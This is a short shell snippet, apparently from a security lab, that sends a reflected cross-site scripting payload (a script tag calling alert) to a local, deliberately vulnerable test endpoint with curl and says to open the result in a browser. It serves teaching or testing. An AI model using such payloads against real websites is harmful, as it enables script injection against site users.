# Reflected XSS payload (will be rendered by page)
curl -s "http://127.0.0.1:5000/vuln/xss?name=<script>alert('xss')</script>"
# Open in browser to see alert

